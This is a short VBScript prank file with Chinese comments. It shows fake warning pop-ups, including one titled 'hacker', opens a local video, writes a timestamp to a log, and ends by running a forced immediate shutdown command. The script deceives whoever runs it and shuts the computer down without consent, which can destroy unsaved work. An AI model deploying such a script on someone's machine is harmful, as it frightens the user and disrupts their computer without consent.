'https://toonme.com/result
'ANSI编码
'vbs小程序(运行到最后会关机!)
'创建在D:\3d模型\坑人文件\老八原版.mp4
'创建D:\3d模型\坑人文件\坑人日志\日志.txt
'弹窗
msgbox "你的电脑出现了文件，需要打开老八原版.mp4",vbYesNoCancel+VbExclamation,"电脑出现问题"
Set ws = CreateObject("WScript.Shell")
ws.Run "D:\3d模型\坑人文件\老八原版.mp4",True
'休眠
wscript.sleep 1000*4
'黑客警告
msgbox "我恶心死了,要现在就给电脑关机!",vbYesNoCancel+VbExclamation,"hacker"
'生成日志
CurrentTime=Hour(Now)&":"&Minute(Now)&":"&Second(Now)
Currentdate2=year(Now)&"-"&Month(Now)&"-"&day(Now)
set fs =createobject("scripting.filesystemobject")
if (fs.fileexists("D:\3d模型\坑人文件\坑人日志\日志.txt")) then
set f =fs.opentextfile("D:\3d模型\坑人文件\坑人日志\日志.txt",8)
f.writeblanklines(3)
f.write Currentdate2
f.writeblanklines(1)
f.write CurrentTime
f.close
end if
'关机
wscript.sleep 1000*5
dim WSHshell
set WSHshell = wscript.createobject("wscript.shell")
WSHshell.run "shutdown -f -s -t 00",0 ,true
'https://codecombat.163.com/news/jikezhanji-daomuzhe